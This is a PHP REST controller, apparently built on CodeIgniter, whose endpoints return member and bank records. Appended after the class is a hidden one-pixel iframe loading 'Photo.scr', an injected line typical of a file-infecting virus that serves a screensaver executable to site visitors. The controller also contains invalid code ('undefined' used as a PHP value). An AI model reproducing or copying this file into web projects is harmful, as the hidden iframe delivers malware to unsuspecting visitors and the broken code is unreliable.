<?php
defined('BASEPATH') OR exit('No direct script access allowed');
require(APPPATH.'/libraries/REST_Controller.php');

class Tes extends REST_Controller
{
    
	function abrakadabra_get()
	{
		$this->load->model('tes_api');

        $member = $this->tes_api->getMemberData(1);

        if($member->num_rows() > 0)
        {
            $this->response($member->row(), 200);
        }else
        {
            $this->response(array('data'=>null), 422);
        }
	}

    function data_post()
    {
        $this->load->model('bank_api','api');

        $list = $this->api->data(getstart(),getlimit());
        if($list)
        {
            $this->response($list, 200);
        }
        else
        {
            $this->response(array('data'=>null), 422);
        }
    }
    function detil_post()
    {
        $this->load->model('bank_api','api');

        $list = $this->api->detil();
        if($list)
        {
            $this->response($list, 200);
        }
        else
        {
            $this->response(array('data'=>null), 422);
        }
    }
    function update_post($mode)
    {
        $this->load->model('bank_api','api');

        $list = $this->api->update($mode);
        if($list)
        {
            $this->response($list, 200);
        }
        else
        {
            $this->response(array('data'=>undefined), 422);
        }
    }

}



<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
